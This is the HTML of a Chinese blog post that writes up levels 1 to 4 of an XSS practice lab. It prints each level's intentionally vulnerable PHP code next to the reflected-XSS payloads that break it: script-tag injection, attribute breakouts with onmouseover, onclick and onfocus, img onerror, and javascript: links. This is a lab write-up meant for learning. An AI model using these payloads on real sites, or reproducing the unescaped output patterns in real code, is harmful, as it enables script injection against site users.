@@ -1,0 +1,1263 @@
+<!DOCTYPE html>
+
+
+
+  
+
+
+<html class="theme-next pisces use-motion" lang="zh-Hans">
+<head><meta name="generator" content="Hexo 3.8.0">
+  <meta charset="UTF-8">
+<meta http-equiv="X-UA-Compatible" content="IE=edge">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+<meta name="theme-color" content="#222">
+
+
+
+
+
+
+
+
+
+<meta http-equiv="Cache-Control" content="no-transform">
+<meta http-equiv="Cache-Control" content="no-siteapp">
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+  <link href="/lib/fancybox/source/jquery.fancybox.css?v=2.1.5" rel="stylesheet" type="text/css">
+
+
+
+
+
+
+
+<link href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2" rel="stylesheet" type="text/css">
+
+<link href="/css/main.css?v=5.1.4" rel="stylesheet" type="text/css">
+
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png?v=5.1.4">
+
+
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png?v=5.1.4">
+
+
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png?v=5.1.4">
+
+
+  <link rel="mask-icon" href="/images/logo.svg?v=5.1.4" color="#222">
+
+
+
+
+
+  <meta name="keywords" content="XSS,">
+
+
+
+
+
+
+
+
+
+
+<meta name="description" content="level1没有任何过滤根据提示点击图片  跳转到如下页面  发现url通过get方法传递参数 修改参数为666  发现在页面中有输出相应内容，可以看出无需闭合双引号，构造如下payload 1level1.php?name=&amp;lt;/h2&amp;gt;&amp;lt;script&amp;gt;alert(1)&amp;lt;/script&amp;gt;&amp;lt;h2&amp;gt;  没有任何过滤，成功执行payload 源码： 1234">
+<meta name="keywords" content="XSS">
+<meta property="og:type" content="article">
+<meta property="og:title" content="XSS挑战之旅">
+<meta property="og:url" content="https://jeremyekek.github.io/2019/05/20/XSS挑战之旅/index.html">
+<meta property="og:site_name" content="EkEk的个人博客">
+<meta property="og:description" content="level1没有任何过滤根据提示点击图片  跳转到如下页面  发现url通过get方法传递参数 修改参数为666  发现在页面中有输出相应内容，可以看出无需闭合双引号，构造如下payload 1level1.php?name=&amp;lt;/h2&amp;gt;&amp;lt;script&amp;gt;alert(1)&amp;lt;/script&amp;gt;&amp;lt;h2&amp;gt;  没有任何过滤，成功执行payload 源码： 1234">
+<meta property="og:locale" content="zh-Hans">
+<meta property="og:image" content="https://jeremyekek.github.io/2019/05/20/XSS挑战之旅/XSS挑战之旅.assets/1558054268267.png">
+<meta property="og:image" content="https://jeremyekek.github.io/2019/05/20/XSS挑战之旅/XSS挑战之旅.assets/1558054405501.png">
+<meta property="og:image" content="https://jeremyekek.github.io/2019/05/20/XSS挑战之旅/XSS挑战之旅.assets/1558054498678.png">
+<meta property="og:image" content="https://jeremyekek.github.io/2019/05/20/XSS挑战之旅/XSS挑战之旅.assets/1558054637265.png">
+<meta property="og:image" content="https://jeremyekek.github.io/2019/05/20/XSS挑战之旅/XSS挑战之旅.assets/1558054961618.png">
+<meta property="og:image" content="https://jeremyekek.github.io/2019/05/20/XSS挑战之旅/XSS挑战之旅.assets/1558055118753.png">
+<meta property="og:image" content="https://jeremyekek.github.io/2019/05/20/XSS挑战之旅/XSS挑战之旅.assets/1558055268881.png">
+<meta property="og:image" content="https://jeremyekek.github.io/2019/05/20/XSS挑战之旅/XSS挑战之旅.assets/1558055385539.png">
+<meta property="og:image" content="https://jeremyekek.github.io/2019/05/20/XSS挑战之旅/XSS挑战之旅.assets/1558055539475.png">
+<meta property="og:image" content="https://jeremyekek.github.io/2019/05/20/XSS挑战之旅/XSS挑战之旅.assets/1558056793437.png">
+<meta property="og:image" content="https://jeremyekek.github.io/2019/05/20/XSS挑战之旅/XSS挑战之旅.assets/1558057130653.png">
+<meta property="og:image" content="https://jeremyekek.github.io/2019/05/20/XSS挑战之旅/XSS挑战之旅.assets/1558056967968.png">
+<meta property="og:image" content="https://jeremyekek.github.io/2019/05/20/XSS挑战之旅/XSS挑战之旅.assets/1558057294923.png">
+<meta property="og:image" content="https://jeremyekek.github.io/2019/05/20/XSS挑战之旅/XSS挑战之旅.assets/1558057537275.png">
+<meta property="og:image" content="https://jeremyekek.github.io/2019/05/20/XSS挑战之旅/XSS挑战之旅.assets/1558057712688.png">
+<meta property="og:image" content="https://jeremyekek.github.io/2019/05/20/XSS挑战之旅/XSS挑战之旅.assets/1558096380758.png">
+<meta property="og:image" content="https://jeremyekek.github.io/2019/05/20/XSS挑战之旅/XSS挑战之旅.assets/1558096540426.png">
+<meta property="og:image" content="https://jeremyekek.github.io/2019/05/20/XSS挑战之旅/XSS挑战之旅.assets/1558098248009.png">
+<meta property="og:image" content="https://jeremyekek.github.io/2019/05/20/XSS挑战之旅/XSS挑战之旅.assets/1558098351438.png">
+<meta property="og:image" content="https://jeremyekek.github.io/2019/05/20/XSS挑战之旅/XSS挑战之旅.assets/1558100639552.png">
+<meta property="og:image" content="https://jeremyekek.github.io/2019/05/20/XSS挑战之旅/XSS挑战之旅.assets/1558100187489.png">
+<meta property="og:image" content="https://jeremyekek.github.io/2019/05/20/XSS挑战之旅/XSS挑战之旅.assets/1558100233619.png">
+<meta property="og:image" content="https://jeremyekek.github.io/2019/05/20/XSS挑战之旅/XSS挑战之旅.assets/1558100422464.png">
+<meta property="og:image" content="https://jeremyekek.github.io/2019/05/20/XSS挑战之旅/XSS挑战之旅.assets/1558102420262.png">
+<meta property="og:image" content="https://jeremyekek.github.io/2019/05/20/XSS挑战之旅/XSS挑战之旅.assets/1558105060724.png">
+<meta property="og:image" content="https://jeremyekek.github.io/2019/05/20/XSS挑战之旅/XSS挑战之旅.assets/1558105341248.png">
+<meta property="og:image" content="https://jeremyekek.github.io/2019/05/20/XSS挑战之旅/XSS挑战之旅.assets/1558105662485.png">
+<meta property="og:image" content="https://jeremyekek.github.io/2019/05/20/XSS挑战之旅/XSS挑战之旅.assets/1558105893509.png">
+<meta property="og:image" content="https://jeremyekek.github.io/2019/05/20/XSS挑战之旅/XSS挑战之旅.assets/1558106118797.png">
+<meta property="og:image" content="https://jeremyekek.github.io/2019/05/20/XSS挑战之旅/XSS挑战之旅.assets/1558237810579.png">
+<meta property="og:image" content="https://jeremyekek.github.io/2019/05/20/XSS挑战之旅/XSS挑战之旅.assets/1558248807926.png">
+<meta property="og:image" content="https://jeremyekek.github.io/2019/05/20/XSS挑战之旅/XSS挑战之旅.assets/1558248919987.png">
+<meta property="og:image" content="https://jeremyekek.github.io/2019/05/20/XSS挑战之旅/XSS挑战之旅.assets/1558249256987.png">
+<meta property="og:image" content="https://jeremyekek.github.io/2019/05/20/XSS挑战之旅/XSS挑战之旅.assets/1558250497766.png">
+<meta property="og:image" content="https://jeremyekek.github.io/2019/05/20/XSS挑战之旅/XSS挑战之旅.assets/1558250601339.png">
+<meta property="og:image" content="https://jeremyekek.github.io/2019/05/20/XSS挑战之旅/XSS挑战之旅.assets/1558251116826.png">
+<meta property="og:image" content="https://jeremyekek.github.io/2019/05/20/XSS挑战之旅/XSS挑战之旅.assets/1558251262671.png">
+<meta property="og:image" content="https://jeremyekek.github.io/2019/05/20/XSS挑战之旅/XSS挑战之旅.assets/1558251563250.png">
+<meta property="og:image" content="https://jeremyekek.github.io/2019/05/20/XSS挑战之旅/XSS挑战之旅.assets/1558251601685.png">
+<meta property="og:image" content="https://jeremyekek.github.io/2019/05/20/XSS挑战之旅/XSS挑战之旅.assets/1558252521803.png">
+<meta property="og:image" content="https://jeremyekek.github.io/2019/05/20/XSS挑战之旅/XSS挑战之旅.assets/1558252884442.png">
+<meta property="og:image" content="https://jeremyekek.github.io/2019/05/20/XSS挑战之旅/XSS挑战之旅.assets/1558253045262.png">
+<meta property="og:image" content="https://jeremyekek.github.io/2019/05/20/XSS挑战之旅/XSS挑战之旅.assets/1558253074469.png">
+<meta property="og:image" content="https://jeremyekek.github.io/2019/05/20/XSS挑战之旅/XSS挑战之旅.assets/1558253383778.png">
+<meta property="og:image" content="https://jeremyekek.github.io/2019/05/20/XSS挑战之旅/XSS挑战之旅.assets/1558253574394.png">
+<meta property="og:image" content="https://jeremyekek.github.io/2019/05/20/XSS挑战之旅/XSS挑战之旅.assets/1558253654942.png">
+<meta property="og:image" content="https://jeremyekek.github.io/2019/05/20/XSS挑战之旅/XSS挑战之旅.assets/1558254716646.png">
+<meta property="og:image" content="https://jeremyekek.github.io/2019/05/20/XSS挑战之旅/XSS挑战之旅.assets/1558254944255.png">
+<meta property="og:image" content="https://jeremyekek.github.io/2019/05/20/XSS挑战之旅/XSS挑战之旅.assets/1558255107617.png">
+<meta property="og:image" content="https://jeremyekek.github.io/2019/05/20/XSS挑战之旅/XSS挑战之旅.assets/1558255149283.png">
+<meta property="og:image" content="https://jeremyekek.github.io/2019/05/20/XSS挑战之旅/XSS挑战之旅.assets/1558360067701.png">
+<meta property="og:image" content="https://jeremyekek.github.io/2019/05/20/XSS挑战之旅/XSS挑战之旅.assets/1558358694058.png">
+<meta property="og:image" content="https://jeremyekek.github.io/2019/05/20/XSS挑战之旅/XSS挑战之旅.assets/1558265228176.png">
+<meta property="og:image" content="https://jeremyekek.github.io/2019/05/20/XSS挑战之旅/XSS挑战之旅.assets/1558266783744.png">
+<meta property="og:image" content="https://jeremyekek.github.io/2019/05/20/XSS挑战之旅/XSS挑战之旅.assets/1558266984431.png">
+<meta property="og:image" content="https://jeremyekek.github.io/2019/05/20/XSS挑战之旅/XSS挑战之旅.assets/1558267117962.png">
+<meta property="og:image" content="https://jeremyekek.github.io/2019/05/20/XSS挑战之旅/XSS挑战之旅.assets/1558265795045.png">
+<meta property="og:image" content="https://jeremyekek.github.io/2019/05/20/XSS挑战之旅/XSS挑战之旅.assets/1558266253831.png">
+<meta property="og:image" content="https://jeremyekek.github.io/2019/05/20/XSS挑战之旅/XSS挑战之旅.assets/1558267796468.png">
+<meta property="og:image" content="https://jeremyekek.github.io/2019/05/20/XSS挑战之旅/XSS挑战之旅.assets/1558268014317.png">
+<meta property="og:image" content="https://jeremyekek.github.io/2019/05/20/XSS挑战之旅/XSS挑战之旅.assets/1558268343632.png">
+<meta property="og:image" content="https://jeremyekek.github.io/2019/05/20/XSS挑战之旅/XSS挑战之旅.assets/1558268510194.png">
+<meta property="og:image" content="https://jeremyekek.github.io/2019/05/20/XSS挑战之旅/XSS挑战之旅.assets/1558273349908.png">
+<meta property="og:image" content="https://jeremyekek.github.io/2019/05/20/XSS挑战之旅/XSS挑战之旅.assets/1558273500807.png">
+<meta property="og:image" content="https://jeremyekek.github.io/2019/05/20/XSS挑战之旅/XSS挑战之旅.assets/1558273987115.png">
+<meta property="og:image" content="https://jeremyekek.github.io/2019/05/20/XSS挑战之旅/XSS挑战之旅.assets/1558274123391.png">
+<meta property="og:image" content="https://jeremyekek.github.io/2019/05/20/XSS挑战之旅/XSS挑战之旅.assets/1558274541848.png">
+<meta property="og:image" content="https://jeremyekek.github.io/2019/05/20/XSS挑战之旅/XSS挑战之旅.assets/1558313314215.png">
+<meta property="og:image" content="https://jeremyekek.github.io/2019/05/20/XSS挑战之旅/XSS挑战之旅.assets/1558315194981.png">
+<meta property="og:image" content="https://jeremyekek.github.io/2019/05/20/XSS挑战之旅/XSS挑战之旅.assets/1558315623256.png">
+<meta property="og:image" content="https://jeremyekek.github.io/2019/05/20/XSS挑战之旅/XSS挑战之旅.assets/1558316052078.png">
+<meta property="og:image" content="https://jeremyekek.github.io/2019/05/20/XSS挑战之旅/XSS挑战之旅.assets/1558316206643.png">
+<meta property="og:image" content="https://jeremyekek.github.io/2019/05/20/XSS挑战之旅/XSS挑战之旅.assets/1558343919410.png">
+<meta property="og:updated_time" content="2019-05-20T13:55:15.055Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="XSS挑战之旅">
+<meta name="twitter:description" content="level1没有任何过滤根据提示点击图片  跳转到如下页面  发现url通过get方法传递参数 修改参数为666  发现在页面中有输出相应内容，可以看出无需闭合双引号，构造如下payload 1level1.php?name=&amp;lt;/h2&amp;gt;&amp;lt;script&amp;gt;alert(1)&amp;lt;/script&amp;gt;&amp;lt;h2&amp;gt;  没有任何过滤，成功执行payload 源码： 1234">
+<meta name="twitter:image" content="https://jeremyekek.github.io/2019/05/20/XSS挑战之旅/XSS挑战之旅.assets/1558054268267.png">
+
+
+
+<script type="text/javascript" id="hexo.configurations">
+  var NexT = window.NexT || {};
+  var CONFIG = {
+    root: '/',
+    scheme: 'Pisces',
+    version: '5.1.4',
+    sidebar: {"position":"right","display":"post","offset":20,"b2t":true,"scrollpercent":false,"onmobile":false},
+    fancybox: true,
+    tabs: true,
+    motion: {"enable":true,"async":true,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
+    duoshuo: {
+      userId: '0',
+      author: '博主'
+    },
+    algolia: {
+      applicationID: '',
+      apiKey: '',
+      indexName: '',
+      hits: {"per_page":10},
+      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
+    }
+  };
+</script>
+
+
+
+  <link rel="canonical" href="https://jeremyekek.github.io/2019/05/20/XSS挑战之旅/">
+
+
+
+
+
+  <title>XSS挑战之旅 | EkEk的个人博客</title>
+  
+
+
+
+
+
+
+
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" lang="zh-Hans">
+
+  
+  
+    
+  
+
+  <div class="container sidebar-position-right page-post-detail">
+    <div class="headband"></div>
+    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-wrapper">
+  <div class="site-meta ">
+    
+
+    <div class="custom-logo-site-title">
+      <a href="/" class="brand" rel="start">
+        <span class="logo-line-before"><i></i></span>
+        <span class="site-title">EkEk的个人博客</span>
+        <span class="logo-line-after"><i></i></span>
+      </a>
+    </div>
+      
+        <p class="site-subtitle"></p>
+      
+  </div>
+
+  <div class="site-nav-toggle">
+    <button>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+    </button>
+  </div>
+</div>
+
+<nav class="site-nav">
+  
+
+  
+    <ul id="menu" class="menu">
+      
+        
+        <li class="menu-item menu-item-home">
+          <a href="/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-home"></i> <br>
+            
+            首页
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-tags">
+          <a href="/tags/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-tags"></i> <br>
+            
+            标签
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-categories">
+          <a href="/categories/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-th"></i> <br>
+            
+            分类
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-archives">
+          <a href="/archives/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-archive"></i> <br>
+            
+            归档
+          </a>
+        </li>
+      
+
+      
+    </ul>
+  
+
+  
+</nav>
+
+
+
+ </div>
+    </header>
+
+    <main id="main" class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          <div id="content" class="content">
+            
+
+  <div id="posts" class="posts-expand">
+    
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="https://jeremyekek.github.io/2019/05/20/XSS挑战之旅/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="EkEk">
+      <meta itemprop="description" content>
+      <meta itemprop="image" content="/images/avatar.gif">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="EkEk的个人博客">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">XSS挑战之旅</h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+
+            
+
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-check-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">更新于&#58;</span>
+              
+              <time title="更新于" itemprop="dateModified" datetime="2019-05-20T21:55:15+08:00">
+                2019-05-20
+              </time>
+            
+          </span>
+
+          
+            <span class="post-category">
+            
+              <span class="post-meta-divider">|</span>
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">分类于</span>
+              
+              
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/技术文章/" itemprop="url" rel="index">
+                    <span itemprop="name">技术文章</span>
+                  </a>
+                </span>
+
+                
+                
+              
+            </span>
+          
+
+          
+            
+              <span class="post-comments-count">
+                <span class="post-meta-divider">|</span>
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-comment-o"></i>
+                </span>
+                <a href="/2019/05/20/XSS挑战之旅/#comments" itemprop="discussionUrl">
+                  <span class="post-comments-count disqus-comment-count" data-disqus-identifier="2019/05/20/XSS挑战之旅/" itemprop="commentCount"></span>
+                </a>
+              </span>
+            
+          
+
+          
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        <h2 id="level1"><a href="#level1" class="headerlink" title="level1"></a>level1</h2><h3 id="没有任何过滤"><a href="#没有任何过滤" class="headerlink" title="没有任何过滤"></a>没有任何过滤</h3><p>根据提示点击图片</p>
+<p><img src="/2019/05/20/XSS挑战之旅/XSS挑战之旅.assets/1558054268267.png" alt="1558054268267"></p>
+<p>跳转到如下页面</p>
+<p><img src="/2019/05/20/XSS挑战之旅/XSS挑战之旅.assets/1558054405501.png" alt="1558054405501"></p>
+<p>发现url通过get方法传递参数</p>
+<p>修改参数为666</p>
+<p><img src="/2019/05/20/XSS挑战之旅/XSS挑战之旅.assets/1558054498678.png" alt="1558054498678"></p>
+<p>发现在页面中有输出相应内容，可以看出无需闭合双引号，构造如下payload</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">level1.php?name=&lt;/h2&gt;&lt;script&gt;alert(1)&lt;/script&gt;&lt;h2&gt;</span><br></pre></td></tr></table></figure>
+<p><img src="/2019/05/20/XSS挑战之旅/XSS挑战之旅.assets/1558054637265.png" alt="1558054637265"></p>
+<p>没有任何过滤，成功执行payload</p>
+<p>源码：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line">ini_set(<span class="string">"display_errors"</span>, <span class="number">0</span>);</span><br><span class="line">$str = $_GET[<span class="string">"name"</span>];</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"&lt;h2 align=center&gt;欢迎用户"</span>.$str.<span class="string">"&lt;/h2&gt;"</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">&lt;center&gt;&lt;img src=level1.png&gt;&lt;/center&gt;</span><br><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="keyword">echo</span> <span class="string">"&lt;h3 align=center&gt;payload的长度:"</span>.strlen($str).<span class="string">"&lt;/h3&gt;"</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+<p>分析：没有做任何过滤</p>
+<h2 id="level2"><a href="#level2" class="headerlink" title="level2"></a>level2</h2><h3 id="部分过滤"><a href="#部分过滤" class="headerlink" title="部分过滤"></a>部分过滤</h3><p>输入内容666</p>
+<p><img src="/2019/05/20/XSS挑战之旅/XSS挑战之旅.assets/1558054961618.png" alt="1558054961618"></p>
+<p>发现有两处输出相应内容的地方，第一处和上一关相同，尝试下同一paylaod</p>
+<p><img src="/2019/05/20/XSS挑战之旅/XSS挑战之旅.assets/1558055118753.png" alt="1558055118753"></p>
+<p>发现<code>&lt;&gt;</code>被实体化转义掉了，这一处无法再进行构造了。</p>
+<p>接下来对另一处进行构造</p>
+<p><img src="/2019/05/20/XSS挑战之旅/XSS挑战之旅.assets/1558055268881.png" alt="1558055268881"></p>
+<p>发现<code>&lt;&gt;</code>没有被转义，构造如下payload</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&quot;&gt;&lt;script&gt;alert(1)&lt;/script&gt;&lt;a href=&quot;</span><br></pre></td></tr></table></figure>
+<p><img src="/2019/05/20/XSS挑战之旅/XSS挑战之旅.assets/1558055385539.png" alt="1558055385539"></p>
+<p>成功执行payload，便于查看代码，我把alert去掉</p>
+<p><img src="/2019/05/20/XSS挑战之旅/XSS挑战之旅.assets/1558055539475.png" alt="1558055539475"></p>
+<p>可以看到成功闭合前后标签，所以script标签里的js代码可以成功执行</p>
+<p>源码：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line">ini_set(<span class="string">"display_errors"</span>, <span class="number">0</span>);</span><br><span class="line">$str = $_GET[<span class="string">"keyword"</span>];</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"&lt;h2 align=center&gt;没有找到和"</span>.htmlspecialchars($str).<span class="string">"相关的结果.&lt;/h2&gt;"</span>.<span class="string">'&lt;center&gt;</span></span><br><span class="line"><span class="string">&lt;form action=level2.php method=GET&gt;</span></span><br><span class="line"><span class="string">&lt;input name=keyword  value="'</span>.$str.<span class="string">'"&gt;</span></span><br><span class="line"><span class="string">&lt;input type=submit name=submit value="搜索"/&gt;</span></span><br><span class="line"><span class="string">&lt;/form&gt;</span></span><br><span class="line"><span class="string">&lt;/center&gt;'</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+<p>分析：</p>
+<p>有两个输出，第一个输出使用htmlspeciachars()进行转义，第二个没有任何过滤，可以在这里进行构造payload。</p>
+<p>两种方法：</p>
+<ol>
+<li><p>不逃逸input标签，闭合引号添加事件触发xss</p>
+<p>鼠标移动至该标签</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&quot; onmouseover=&quot;alert(1)</span><br></pre></td></tr></table></figure>
+<p>点击触发</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&quot; onclick=&quot;alert(1)</span><br></pre></td></tr></table></figure>
+<p>点击输入框</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&quot; onfocus=&quot;alert(1)</span><br></pre></td></tr></table></figure>
+<p>等等很多事件，这里贴个网上的链接<a href="https://www.smi1e.top/xss-payload/" target="_blank" rel="noopener">XSS-Payload</a></p>
+</li>
+<li><p>逃逸出input标签,使用其他标签触发xss</p>
+<p><code>&lt;script&gt;</code>标签</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&quot;&gt;&lt;script&gt;alert(1)&lt;/script&gt;&lt;a href=&quot;</span><br></pre></td></tr></table></figure>
+<p><code>&lt;img&gt;</code>标签</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&quot;&gt;&lt;img src=x onerror=&quot;alert(1)&quot;&gt;//</span><br></pre></td></tr></table></figure>
+<p><code>&lt;a&gt;</code>标签</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&quot;&gt;&lt;a href=&quot;javascript:alert(1)&quot;&gt;xss&lt;/a&gt;//</span><br><span class="line">&quot;&gt;&lt;a href=&quot;&quot; onmouseover=&quot;alert(1)&quot;&gt;xss&lt;/a&gt;//</span><br></pre></td></tr></table></figure>
+<p>等等</p>
+</li>
+</ol>
+<h2 id="level3"><a href="#level3" class="headerlink" title="level3"></a>level3</h2><h3 id="实体化转义绕过"><a href="#实体化转义绕过" class="headerlink" title="实体化转义绕过"></a>实体化转义绕过</h3><p><img src="/2019/05/20/XSS挑战之旅/XSS挑战之旅.assets/1558056793437.png" alt="1558056793437"></p>
+<p>看起来跟level一样，试一下闭合掉value属性</p>
+<p><img src="/2019/05/20/XSS挑战之旅/XSS挑战之旅.assets/1558057130653.png" alt="1558057130653"></p>
+<p>闭合语句虽然没有问题，但是看起来被转义掉了</p>
+<p><img src="/2019/05/20/XSS挑战之旅/XSS挑战之旅.assets/1558056967968.png" alt="1558056967968"></p>
+<p>双引号被转义，再尝试一下单引号<code>&#39;</code></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&apos;&gt;&lt;script&gt;alert(1)&lt;/script&gt;&lt;a href=&apos;</span><br></pre></td></tr></table></figure>
+<p><img src="/2019/05/20/XSS挑战之旅/XSS挑战之旅.assets/1558057294923.png" alt="1558057294923"></p>
+<p>可以看出来 <code>value=&quot;&quot;</code> 成功闭合，但是 <code>&lt;&gt;</code> 依旧被转义</p>
+<p>再尝试另一种办法，添加事件属性</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&apos; onmouseover=&apos;alert(1)</span><br></pre></td></tr></table></figure>
+<p><img src="/2019/05/20/XSS挑战之旅/XSS挑战之旅.assets/1558057537275.png" alt="1558057537275"></p>
+<p>可以看到成功触发事件属性里的js代码</p>
+<p>源码：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line">ini_set(<span class="string">"display_errors"</span>, <span class="number">0</span>);</span><br><span class="line">$str = $_GET[<span class="string">"keyword"</span>];</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"&lt;h2 align=center&gt;没有找到和"</span>.htmlspecialchars($str).<span class="string">"相关的结果.&lt;/h2&gt;"</span>.<span class="string">"&lt;center&gt;</span></span><br><span class="line"><span class="string">&lt;form action=level3.php method=GET&gt;</span></span><br><span class="line"><span class="string">&lt;input name=keyword  value='"</span>.htmlspecialchars($str).<span class="string">"'&gt;</span></span><br><span class="line"><span class="string">&lt;input type=submit name=submit value=搜索 /&gt;</span></span><br><span class="line"><span class="string">&lt;/form&gt;</span></span><br><span class="line"><span class="string">&lt;/center&gt;"</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+<p>分析：</p>
+<p>两个输出点都做了htmlspecialchars()转义，但是第二个拼接的语句使用了单引号<code>&#39;</code>，而且htmlspecialchars()函数使用默认参数不会对单引号进行转义，所以可以使用单引号闭合前面的属性</p>
+<h2 id="level4"><a href="#level4" class="headerlink" title="level4"></a>level4</h2><h3 id="事件属性逃逸"><a href="#事件属性逃逸" class="headerlink" title="事件属性逃逸"></a>事件属性逃逸</h3><p>跟上关很像，试一下闭合标签</p>
+<p><img src="/2019/05/20/XSS挑战之旅/XSS挑战之旅.assets/1558057712688.png" alt="1558057712688"></p>
+<p>发现<code>&lt;&gt;</code>全部被过滤掉了，那就使用事件属性</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&quot; onmouseover=&quot;alert(1)</span><br></pre></td></tr></table></figure>
+<p>成功执行payload</p>
+<p><img src="/2019/05/20/XSS挑战之旅/XSS挑战之旅.assets/1558096380758.png" alt="1558096380758"></p>
+<p>源码：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line">ini_set(<span class="string">"display_errors"</span>, <span class="number">0</span>);</span><br><span class="line">$str = $_GET[<span class="string">"keyword"</span>];</span><br><span class="line">$str2=str_replace(<span class="string">"&gt;"</span>,<span class="string">""</span>,$str);</span><br><span class="line">$str3=str_replace(<span class="string">"&lt;"</span>,<span class="string">""</span>,$str2);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"&lt;h2 align=center&gt;没有找到和"</span>.htmlspecialchars($str).<span class="string">"相关的结果.&lt;/h2&gt;"</span>.<span class="string">'&lt;center&gt;</span></span><br><span class="line"><span class="string">&lt;form action=level4.php method=GET&gt;</span></span><br><span class="line"><span class="string">&lt;input name=keyword  value="'</span>.$str3.<span class="string">'"&gt;</span></span><br><span class="line"><span class="string">&lt;input type=submit name=submit value=搜索 /&gt;</span></span><br><span class="line"><span class="string">&lt;/form&gt;</span></span><br><span class="line"><span class="string">&lt;/center&gt;'</span>;</span><br><span class="line"><span 